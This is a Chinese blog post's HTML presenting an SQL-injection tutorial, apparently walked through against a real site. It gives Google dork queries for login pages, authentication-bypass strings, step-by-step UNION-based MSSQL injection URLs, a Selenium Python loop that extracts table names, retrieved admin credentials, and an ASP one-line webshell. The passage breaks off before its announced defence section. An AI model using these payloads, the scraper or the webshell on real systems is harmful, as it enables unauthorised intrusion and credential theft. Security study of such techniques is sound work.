@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>从数据库原理学习网络攻防及防止SQL注入 | 我们增长自己的智慧，是为了给自己开一朵花</title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://Tyro-Shan.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://Tyro-Shan.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="从数据库原理学习网络攻防及防止SQL注入 | 我们增长自己的智慧，是为了给自己开一朵花 » Feed" href="https://Tyro-Shan.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://Tyro-Shan.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://Tyro-Shan.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="从数据库原理学习网络攻防及防止SQL注入"/>
+    <meta property="og:url" content="https://Tyro-Shan.github.io/post/cong-shu-ju-ku-yuan-li-xue-xi-wang-luo-gong-fang-ji-fang-zhi-sql-zhu-ru/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content="我们增长自己的智慧，是为了给自己开一朵花"/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://Tyro-Shan.github.io">我们增长自己的智慧，是为了给自己开一朵花</a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">标签</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://Tyro-Shan.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+        </span>
+            <h1>从数据库原理学习网络攻防及防止SQL注入</h1>
+            <span class="meta">
+            	Posted on
+              2018-10-18，12 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>这是最近自己学习渗透和网站攻防的文章，希望能深入地学习这部分知识，同时认了Na师傅和Rong师傅，知道了人外有人、天外有天，真的很享受这种探索问题、解决问题和分析知识的过程。希望文章对你有所帮助，尤其是学习网站如何防止SQL注入及数据库原理的初学者或安全工程师。如果文章中存在错误或不足之处，还请海涵~<br></span></p><p><span style="font-family:'Microsoft YaHei';font-size:18px;">    一.Google搜索知识<br></span><span style="font-family:'Microsoft YaHei';font-size:18px;">    二.万能密码原理<br></span><span style="font-family:'Microsoft YaHei';font-size:18px;">    三.数据库解读SQL注入攻防原理<br></span><span style="font-family:'Microsoft YaHei';font-size:18px;">        1.数据库如何判断注入点<br></span><span style="font-family:'Microsoft YaHei';font-size:18px;">        2.数据库如何判断字段总数 order by<br></span><span style="font-family:'Microsoft YaHei';font-size:18px;">        3.数据库获取显示位 union<br></span><span style="font-family:'Microsoft YaHei';font-size:18px;">        4.数据库显示错误网页及对应数据 db_name<br></span><span style="font-family:'Microsoft YaHei';font-size:18px;">        5.数据库获取表名及列名，Python爬虫引入<br></span><span style="font-family:'Microsoft YaHei';font-size:18px;">        6.数据库获取登录表usr字段 id=object_id('usr')<br></span><span style="font-family:'Microsoft YaHei';font-size:18px;">        7.数据库返回用户名和密码 <br></span><span style="font-family:'Microsoft YaHei';font-size:18px;">        8.登录系统并获取WebShell<br>    四.防SQL注入措施及建议</span></p><p><br></p><h2><a name="t0"></a><a name="t0"></a><span style="font-family:'Microsoft YaHei';font-size:24px;color:#3333ff;">一. Google搜索知识</span></h2><div><span style="font-family:'Microsoft YaHei';font-size:18px;"><br>Google提供了强大的搜索功能，可以获取精准的结果。如果访问不了，也可以通过百度获取相关内容，但是结果远没有谷歌精准，很多无关的广告及视频会返回给你。<br>方法如下：</span></div><div><span style="font-family:'Microsoft YaHei';font-size:18px;"><strong><br>intitle:eastmount</strong><br>搜索网页标题包含eastmount字符的网页。<br><br></span><div style="text-align:center;"><img src="https://img-blog.csdn.net/20170627225058055" width="500" height="350" alt=""></div><br></div><div><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;"><strong>inurl:cbi</strong><br><span style="color:rgb(51,51,51);font-family:'Microsoft YaHei';font-size:18px;">搜索包含特定字符cbi的URL。</span><br></span></span></div><div><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;"><br></span></span></div><div><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;"><strong>intext:cbi</strong><br><span style="color:rgb(51,51,51);font-family:'Microsoft YaHei';font-size:18px;">搜索网页正文内容包含特定字符cbi的网页。</span><br></span></span></div><div><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;"><br></span></span></div><div><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;"><strong>filetype:ppt</strong><br><span style="color:rgb(51,51,51);font-family:'Microsoft YaHei';font-size:18px;">搜索制定类型的文件，返回所有以ppt结尾的文件URL。</span><br></span></span></div><div><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;"><br></span></span></div><div><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;"><strong>site</strong><br><span style="color:rgb(51,51,51);font-family:'Microsoft YaHei';font-size:18px;">找到与指定网站有联系的URL。</span><br></span></span></div><div><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;"><br>常用示例：inurl:login.asp、inurl:asp?id=、inurl:login.asp intilte:贵州<br><br></span></span><div style="text-align:center;"><img src="https://img-blog.csdn.net/20170627225958480" width="500" height="350" alt=""></div></div><div><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;"><br></span></span></div><div><span style="font-family:'Microsoft YaHei';font-size:18px;"><br></span></div><div><span style="font-family:'Microsoft YaHei';font-size:24px;color:#3333ff;"><br></span></div><h2><a name="t1"></a><a name="t1"></a><span style="font-family:'Microsoft YaHei';font-size:24px;color:#3333ff;">二. 万能密码原理</span></h2><p><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;">万能密码通常是指开发人员在开发过程中使用超级管理员进行开发，开发完成后没有过滤掉这些常用的超级管理员；另一种是存在SQL漏洞管理员账号。下面分别进行讨论：</span></span></p><p><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;">1.万能密码：用户名 admin、密码admin，用户名admin、密码123456</span></span></p><p><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;">2.万能密码：用户名 'or'='or'、密码 'or'='or'<br>   原理解释：假设用户登录对应的语句为：<br>  <span style="color:#3333ff;"> select name, pwd from login where name='' and pwd='';</span><br>   如果用户名输入正确则直接登录，否则提示用户名或密码错误，使用万能密码后的SQL语句如下：<br>   <span style="color:#3333ff;">select name, pwd from login where name='<strong>'or'='or'</strong>' and pwd='<span style="font-family:'Microsoft YaHei';font-size:18px;"><strong>'or'='or'</strong></span></span>';<br>   核心代码，两个单引号匹配，即name=''，然后or连接，单引号等于单引号('=')这是恒成立的，紧接着or连接两个单引号('')，同理密码pwd。这样or连接的('=')是恒成立的，故返回结果为真，导致直接登录。</span></span></p><p><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;">3.万能密码：用户名 'or''='、密码'or''='<br>   原理解释：此时对应的SQL语句如下：<br>   <span style="color:#3333ff;"><span style="font-family:'Microsoft YaHei';font-size:18px;">select name, pwd from login where name='</span><span style="font-family:'Microsoft YaHei';font-size:18px;"><strong>'or''='</strong></span><span style="font-family:'Microsoft YaHei';font-size:18px;">' and pwd='</span><span style="font-family:'Microsoft YaHei';font-size:18px;"><strong>'or''='</strong></span></span><span style="font-family:'Microsoft YaHei';font-size:18px;"><span style="color:#3333ff;">';</span><br></span></span></span></p><p><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;"><span style="font-family:'Microsoft YaHei';font-size:18px;">4.万能密码：用户名'or'='--、密码'or'='--<br>   <span style="font-family:'Microsoft YaHei';font-size:18px;">原理解释：此时对应的SQL语句如下：<br>   <span style="color:#3333ff;"><span style="font-family:'Microsoft YaHei';font-size:18px;">select name, pwd from login where name='</span><span style="font-family:'Microsoft YaHei';font-size:18px;"><strong>'or'='--</strong></span><span style="font-family:'Microsoft YaHei';font-size:18px;">' and pwd='</span><span style="font-family:'Microsoft YaHei';font-size:18px;"><strong>'or'='--</strong></span><span style="font-family:'Microsoft YaHei';font-size:18px;">';</span></span></span></span></span></span></p><p><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;"><br>通过如 inurl:login.asp 等搜索技术找到一些列网站后台登录界面后，反复尝试这些万能密码进行登录。防范措施也比较简单：</span></span></p><p><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;">1.开发人员开发完成后，过滤掉admin等常用账号或修改密码；<br>2.当用户第一次登录的时候，对简单的密码进行修改提示，防止暴力破解；<br>3.用户名或密码屏蔽掉单引号(')、等号(=)、注释(--)等特殊字符；<br>4.对尝试SQL注入的IP地址进行报警提示或日志记录。<br><br><br></span></span><br></p><h2><a name="t2"></a><a name="t2"></a><span style="font-family:'Microsoft YaHei';font-size:24px;color:#3333ff;">三. 数据库解读SQL注入攻防原理</span></h2><p><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;">下面通过一个简单的例子从数据库原理知识解读SQL注入攻防原理，内容比较简单，但希望假设存在一个网址<span style="font-family:'Microsoft YaHei';font-size:18px;">能正常显示内容</span>：<br><span style="color:#ff0000;">http://xxxxx/show.asp?code=115</span><br>对应的后台SQL语句可能如下：<br><span style="color:#3333ff;">select .... from table where code='115' and xxxx;</span></span></span></p><p><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;"><br></span></span></p><p><span style="font-family:'Microsoft YaHei';font-size:18px;"><strong>1.数据库如何判断注入点</strong></span></p><p><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;">判断注入点的方法很多，比如show.asp?code=115' 加单引号，<span style="font-family:'Microsoft YaHei';font-size:18px;">show.asp?code=115-1 减1，这里介绍一个经典的方法。<br><span style="color:#ff0000;">(1) </span><span style="font-family:'Microsoft YaHei';font-size:18px;"><span style="font-family:'Microsoft YaHei';font-size:18px;"><span style="color:#ff0000;">http://xxxxx/show.asp?code=115</span><span style="color:#ff0000;"><strong>' and 1=1 --      </strong></span> (<span style="font-family:'Microsoft YaHei';font-size:18px;">正常显示</span>)<br>对应的SQL语句：<br><span style="font-family:'Microsoft YaHei';font-size:18px;"><span style="color:#3333ff;">select .... from table where code='115' and 1=1 -- </span><span style="color:rgb(51,51,255);font-family:'Microsoft YaHei';font-size:18px;">and xxxx;<br></span>单引号(')匹配code='115，然后and连接，1=1恒成立，注释(--)掉后面语句。<br></span><br><span style="color:#ff0000;">(2) <span style="font-family:'Microsoft YaHei';font-size:18px;">h</span></span><span style="color:rgb(255,0,0);font-family:'Microsoft YaHei';font-size:18px;">ttp://xxxxx/show.asp?code=115</span><span style="font-family:'Microsoft YaHei';font-size:18px;"><span style="color:rgb(255,0,0);">' and 1=2 --       </span>(<span style="font-family:'Microsoft YaHei';font-size:18px;">错误显示</span>)<br></span>对应的SQL语句：<br><span style="color:#3333ff;font-family:'Microsoft YaHei';font-size:18px;">select .... from table where code='115' and 1=2 -- </span><span style="font-family:'Microsoft YaHei';font-size:18px;color:rgb(51,51,255);">and xxxx;<br></span><span style="font-family:'Microsoft YaHei';font-size:18px;">单引号(')匹配code='115，然后and连接，1=2恒错误，注释(--)掉后面语句。<br></span></span></span><br></span></span></span></p><p><span style="font-family:'Microsoft YaHei';font-size:18px;"><strong>2.数据库如何判断字段总数 order by</strong></span></p><p><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;"><span style="color:#ff0000;">(1) </span><span style="font-family:'Microsoft YaHei';font-size:18px;"><span><span><span style="color:#ff0000;">http://xxxxx/show.asp?code=115</span><span><span style="color:rgb(255,0,0);">' order by 1 --    </span>(正常显示)<br><span style="font-family:'Microsoft YaHei';font-size:18px;"><span style="font-family:'Microsoft YaHei';font-size:18px;">对应的SQL语句：<br></span></span><span style="font-family:'Microsoft YaHei';font-size:18px;color:rgb(51,51,255);">select .... from table where code='115' order by 1 -- </span><span style="font-family:'Microsoft YaHei';font-size:18px;color:rgb(51,51,255);">and xxxx;<br></span>按照1个字段进行排序，正常显示表示该URL对应的SQL语句至少一个字段。<br><br><span style="color:#ff0000;font-family:'Microsoft YaHei';font-size:18px;">(2) </span><span style="font-family:'Microsoft YaHei';font-size:18px;"><span><span><span style="color:#ff0000;">http://xxxxx/show.asp?code=115</span><span style="color:rgb(255,0,0);"><strong>' order by 10 -- </strong></span><span> <span style="font-family:'Microsoft YaHei';font-size:18px;">(正常显示)<br><span style="font-family:'Microsoft YaHei';font-size:18px;"><span style="font-family:'Microsoft YaHei';font-size:18px;">对应的SQL语句：</span></span><br><span style="font-family:'Microsoft YaHei';font-size:18px;color:rgb(51,51,255);">select .... from table where code='115' <span style="color:rgb(51,51,255);font-family:'Microsoft YaHei';font-size:18px;">order by 10</span> -- </span><span style="font-family:'Microsoft YaHei';font-size:18px;color:rgb(51,51,255);">and xxxx;<br></span>依次按照字段增加网上进行排序，如果提示错误order by 11，则表示共10个字段。<br><br></span></span></span></span></span><span style="font-family:'Microsoft YaHei';font-size:18px;"><span style="font-family:'Microsoft YaHei';font-size:18px;color:rgb(255,0,0);">(3) </span><span style="font-family:'Microsoft YaHei';font-size:18px;"><span style="color:#ff0000;">http://xxxxx/show.asp?code=115</span><span style="color:rgb(255,0,0);"><strong>' order by 11 --  </strong></span></span>(错误显示)</span><br><span style="color:#ff0000;"><strong> </strong></span></span></span></span></span><br></span></span><br></p><p><span style="font-family:'Microsoft YaHei';font-size:18px;"><strong>3.数据库获取显示位 union</strong></span></p><p><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;">在得到字段个数后，需要获取字段位置，则使用union或union all。其中union表示将两个select结果整体显示，并合并相同的结果，union all显示全部结果。例如：<br><br></span></span></p><div style="text-align:center;"><img src="https://img-blog.csdn.net/20170712230408730" width="460" height="300" alt=""></div><br><span style="font-family:'Microsoft YaHei';font-size:18px;color:rgb(255,0,0);">(1) </span><span style="font-family:'Microsoft YaHei';font-size:18px;"><span style="color:#ff0000;">http://xxxxx/show.asp?code=115</span><span style="color:rgb(255,0,0);"><strong>' union all select null,...,null -- </strong></span> <br>正常显示，共10个null，表示通配符，如果9个null会报错，需对应10个字段。<br></span><span style="color:#ff0000;"><br></span><span style="font-family:'Microsoft YaHei';font-size:18px;"><span style="color:rgb(255,0,0);">(2) </span><span style="color:rgb(255,0,0);">http://xxxxx/show.asp?code=115</span><span style="color:rgb(255,0,0);"><strong>' union all select 1,...,null -- </strong></span> <br>依次替换成数字，测试哪几个字段有结果，如果报错则替换回null。最终的结果为：<br><span style="color:rgb(255,0,0);">show.asp?code=115</span><strong><span style="color:#ff0000;">' union all select 1,null,3,null,null,6,7,8,9,10 --<br></span></strong>对应的SQL语句为：<br></span><span style="color:#3333ff;"><span style="font-family:'Microsoft YaHei';font-size:18px;">select .... from table where code='115' union all select 1,null,3,null,null,6,7,8,9,10 --</span><span style="font-family:'Microsoft YaHei';font-size:18px;"> xxxx;</span><br><br><span style="font-family:'Microsoft YaHei';font-size:18px;"><span style="color:rgb(255,0,0);">(3) </span><span style="color:rgb(255,0,0);">http://xxxxx/show.asp?code=-1</span><span style="color:rgb(255,0,0);"><strong>' union all select 1,...,null -- </strong></span> <br></span></span><span style="font-family:'Microsoft YaHei';font-size:18px;">然后将数字115替换成-1，一个不存在的界面，则会显示如下所示结果，可以看到附件显示对应的值7、8、9，再想办法将我们需要的结果在这里显示即可，这些数据都是从后台数据库中查询出来的。</span><br><br><div style="text-align:center;"><img src="https://img-blog.csdn.net/20170712231306296" width="300" height="200" alt=""></div><br><p></p><p><span style="font-family:'Microsoft YaHei';font-size:18px;"><strong>4.数据库显示错误网页及对应数据 db_name</strong></span></p><p><span style="font-family:'Microsoft YaHei';font-size:18px;">该网站使用的数据库为MSSQL，则一定特定的字段需要知道：<br>   host_name()：连接数据库服务器的计算机名称<br>   @@version：获取数据库版本号<br>   db_name()：数据库的库名称<br>   @@servername：当前数据库计算机的名称=host_name()<br><br><span style="font-family:'Microsoft YaHei';font-size:18px;color:rgb(255,0,0);">(1) </span><span style="font-family:'Microsoft YaHei';font-size:18px;"><span><span><span style="color:rgb(255,0,0);">http://xxxxx/show.asp?code=-1</span><span style="color:rgb(255,0,0);"><strong>' union all <br>select <span style="font-family:'Microsoft YaHei';font-size:18px;"><span style="color:#ff0000;">1,null,3,null,null,6,host_name(),@@version,db_name(),10 --</span></span> </strong></span> <br></span></span></span>输出结果如下所示：<br>    附件1：AYD<br>    附件2：Microsoft SQL Server....<br>    附件3：ahykd_new<br>其中数据库的名称就是ahykd_new，接下来相同的道理获取数据库所有表及列。<br></span><br></p><p><span style="font-family:'Microsoft YaHei';font-size:18px;"><strong>5.数据库获取表名及列名，Python爬虫引入</strong></span></p><p><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;">SQL Server自带系统对象表，当前数据库所有字段。<br>    sysobjects 表名<br>    syscolumns 列名<br>其中，name表示对象名（表名），id表示表编号，type表示对象类型，其值为U表示用户表，S表示系统表，C约束，PK主键等。<br><span style="font-family:'Microsoft YaHei';font-size:18px;">sysobjects 和 </span><span style="font-family:'Microsoft YaHei';font-size:18px;">syscolumns 之间以id互相对应，一个表名在sysobjects得到id后可以在syscolumns找到它的列名。<br>重点知识：<br></span>a.查看所有表名语句<br><span style="color:#3333ff;">select name from sysobjects where type='U';</span><br> b.询表table1的所有字段名称<br><span style="color:#3333ff;">select name from syscolumns where id=object_id('table1')；</span><br><br><span style="font-family:'Microsoft YaHei';font-size:18px;color:rgb(255,0,0);">(1) </span><span style="font-family:'Microsoft YaHei';font-size:18px;"><span style="color:rgb(255,0,0);">http://xxxxx/show.asp?code=-1</span><span style="color:rgb(255,0,0);">' union all <br>select </span><span style="color:rgb(255,0,0);"><strong>1,null,3,null,null,6,7,8,<br>(select top 1 name from sysobjects where type='U'),10 --<br></strong></span><span style="font-family:'Microsoft YaHei';font-size:18px;">输出结果如下所示： </span></span><br><span style="font-family:'Microsoft YaHei';font-size:18px;">    附件1：7</span><br style="font-family:'Microsoft YaHei';font-size:18px;"><span style="font-family:'Microsoft YaHei';font-size:18px;">    附件2：8</span><br style="font-family:'Microsoft YaHei';font-size:18px;"><span style="font-family:'Microsoft YaHei';font-size:18px;">    附件3：kc_jxjd<br></span>其中top 1 name用于输出1个字段(相当于MySQL使用limit 1)，sysobjects中u为用户表，count(<em>)可以统计总共87个表。<br>问题：现在是获取1个表，那么如何获取其他表呢？<br><br><span style="font-family:'Microsoft YaHei';font-size:18px;color:rgb(255,0,0);">(2) </span><span style="font-family:'Microsoft YaHei';font-size:18px;"><span><span><span style="color:rgb(255,0,0);">http://xxxxx/show.asp?code=-1</span><span><span style="color:rgb(255,0,0);">' union all <br>select </span><strong><span style="color:#ff0000;">1,null,3,null,null,6,7,8, (select top 1 name from </span><br><span style="color:#ff0000;">(select top </span><span style="color:#3333ff;">2</span><span style="color:#ff0000;"> name from </span><span style="color:rgb(255,0,0);font-family:'Microsoft YaHei';font-size:18px;"><strong>sysobjects <span style="color:rgb(255,0,0);font-family:'Microsoft YaHei';font-size:18px;"><strong>where type='U' order by desc</strong></span></strong></span><span style="color:#ff0000;">) a </span><br><span style="color:#ff0000;">order by 1 asc),10 --</span></strong></span></span></span></span><br>通过子查询一个升序，一个降序获取第二个值，同理第三个top 3。<br>下面通过Python定义一个爬虫不断访问top n，获取所有的表名，代码如下：<br></span></span></p><pre><code class="language-python hljs"><ol class="hljs-ln" style="width:1875px"><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="1"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-comment"># coding=utf-8</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="2"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver             </div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="3"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">driver = webdriver.Firefox()    </div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="4"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"> </div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="5"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-comment">#查询表的名字</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="6"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-comment">#(select top 1 name from (select top &quot; + str(i) +&quot; name from sysobjects where xtype='u' order by 1 asc)a order by 1 desc)</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="7"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">i = <span class="hljs-number">1</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="8"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-keyword">while</span> i&lt;=<span class="hljs-number">87</span>:</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="9"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">    url = <span class="hljs-string">&quot;http://...tztgxx.aspx?code=-115' union all select 1,null,1,null,null,6,host_name(),@@servername,(select top 1 name from (select top &quot;</span> + str(i) +<span class="hljs-string">&quot; name from sysobjects where xtype='u' order by 1 asc)a order by 1 desc),10 --&quot;</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="10"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">    <span class="hljs-comment">#print url</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="11"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">    driver.get(url)</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="12"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">    elem = driver.find_element_by_xpath(<span class="hljs-string">&quot;//form[@name='form1']/div[2]/table/tbody/tr[7]&quot;</span>)</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="13"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">    <span class="hljs-keyword">print</span> elem.text</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="14"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">    i = i + <span class="hljs-number">1</span></div></div></li></ol></code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre><span style="font-family:'Microsoft YaHei';font-size:18px;">分析输出的所有表名，可以发现usr为后台登录表。</span><br><br><p></p><p><span style="font-family:'Microsoft YaHei';font-size:18px;"><strong>6.数据库获取登录表usr字段 id=object_id('usr')</strong></span></p><p><span style="font-family:'Microsoft YaHei';font-size:18px;"><span style="font-family:'Microsoft YaHei';font-size:18px;color:rgb(255,0,0);">(1) </span><span style="font-family:'Microsoft YaHei';font-size:18px;"><span><span><span style="color:rgb(255,0,0);">http://xxxxx/show.asp?code=-1</span><span><span style="color:rgb(255,0,0);">' union all <br>select </span><span><span><span style="color:rgb(255,0,0);">1,null,3,null,null,6,7,8,<br>(select top 1 name from syscolmns where id=object_id('usr')),10 --</span><br><span style="font-family:'Microsoft YaHei';font-size:18px;">输出结果如下所示： </span><br style="font-family:'Microsoft YaHei';font-size:18px;"><span style="font-family:'Microsoft YaHei';font-size:18px;">    附件1：7</span><br style="font-family:'Microsoft YaHei';font-size:18px;"><span style="font-family:'Microsoft YaHei';font-size:18px;">    附件2：8</span><br style="font-family:'Microsoft YaHei';font-size:18px;"><span style="font-family:'Microsoft YaHei';font-size:18px;">    附件3：answer<br></span><span style="font-family:'Microsoft YaHei';font-size:18px;">其中top 1 name用于输出1个字段，表usr的一个列表。<br><br>(2) 核心SQL语句获取不同的列名：<br><span style="color:#ff0000;font-family:'Microsoft YaHei';font-size:18px;"><strong>(select top 1 name from </strong></span><span style="color:#ff0000;font-family:'Microsoft YaHei';font-size:18px;"><strong>(select top </strong></span><span style="color:#3333ff;font-family:'Microsoft YaHei';font-size:18px;"><strong>3</strong></span><span style="color:#ff0000;font-family:'Microsoft YaHei';font-size:18px;"><strong> name from </strong></span><span style="font-family:'Microsoft YaHei';font-size:18px;color:rgb(255,0,0);"><strong>syscolumns where id=object_id('usr') order by asc</strong></span><span style="color:#ff0000;font-family:'Microsoft YaHei';font-size:18px;"><strong>) a </strong></span><span style="color:#ff0000;font-family:'Microsoft YaHei';font-size:18px;"><strong>order by 1 desc)<br></strong></span><span style="font-family:'Microsoft YaHei';font-size:18px;">输出结果如下所示： </span><br style="font-family:'Microsoft YaHei';font-size:18px;"><span style="font-family:'Microsoft YaHei';font-size:18px;">    附件1：7</span><br style="font-family:'Microsoft YaHei';font-size:18px;"><span style="font-family:'Microsoft YaHei';font-size:18px;">    附件2：8</span><br style="font-family:'Microsoft YaHei';font-size:18px;"><span style="font-family:'Microsoft YaHei';font-size:18px;">    附件3：dic_roll<br></span>同理，也可以借助Python获取所有字段，如果字段少，手工即可测试出来，count(</em>)返回字段个数。最后发现，用户名为usr_name，密码为passwd。<br></span><br></span></span></span></span></span></span></span></p><p><span style="font-family:'Microsoft YaHei';font-size:18px;"><strong>7.数据库返回用户名和密码 </strong></span></p><p><span style="font-family:'Microsoft YaHei';font-size:18px;color:rgb(255,0,0);">(1) </span><span style="font-family:'Microsoft YaHei';font-size:18px;"><span><span><span style="color:rgb(255,0,0);">http://xxxxx/show.asp?code=-1</span><span><span style="color:rgb(255,0,0);">' union all <br>select </span><span><span><span><span style="color:#ff0000;">1,null,3,null,null,6,7,8,<strong>(select top 1 usr_name from usr)</strong>,10 --</span><br><span style="font-family:'Microsoft YaHei';font-size:18px;">输出结果如下所示： </span><br style="font-family:'Microsoft YaHei';font-size:18px;"><span style="font-family:'Microsoft YaHei';font-size:18px;">    附件1：7</span><br style="font-family:'Microsoft YaHei';font-size:18px;"><span style="font-family:'Microsoft YaHei';font-size:18px;">    附件2：8</span><br style="font-family:'Microsoft YaHei';font-size:18px;"><span style="font-family:'Microsoft YaHei';font-size:18px;">    附件3：2016001<br></span>输出用户名2016001，在搜索密码。<br><br><span style="font-family:'Microsoft YaHei';font-size:18px;color:rgb(255,0,0);">(2) </span><span style="font-family:'Microsoft YaHei';font-size:18px;"><span><span><span style="color:rgb(255,0,0);">http://xxxxx/show.asp?code=-1</span><span><span style="color:rgb(255,0,0);">' union all <br>select </span><span><span><span style="color:#ff0000;">1,null,3,null,null,6,7,8,<br><strong>(select passwd  from usr where <span style="color:rgb(255,0,0);font-family:'Microsoft YaHei';font-size:18px;">usr_name='2016001'</span>)</strong>,10 --</span><br>输出结果如下所示： <br><span style="font-size:18px;">    附件1：7</span><br style="font-size:18px;"><span style="font-size:18px;">    附件2：8</span><br style="font-size:18px;"><span style="font-size:18px;">    附件3：123456<br></span>输出用户名2016001，密码123456，此时即可登录，通过Python可以获取所有值。<br></span></span></span></span></span></span></span></span></span></span></span></span></span><br><br></p><p><span style="font-family:'Microsoft YaHei';font-size:18px;"><strong>8.登录系统并获取WebShell</strong></span></p><p><span style="font-family:'Microsoft YaHei';font-size:18px;">登录后台基本完成，下面将讲解如何进行SQL防御。<br>PS：&lt;%eval request(&quot;Nana&quot;) %&gt;<br></span><br></p><p><span style="font-family:'Microsoft 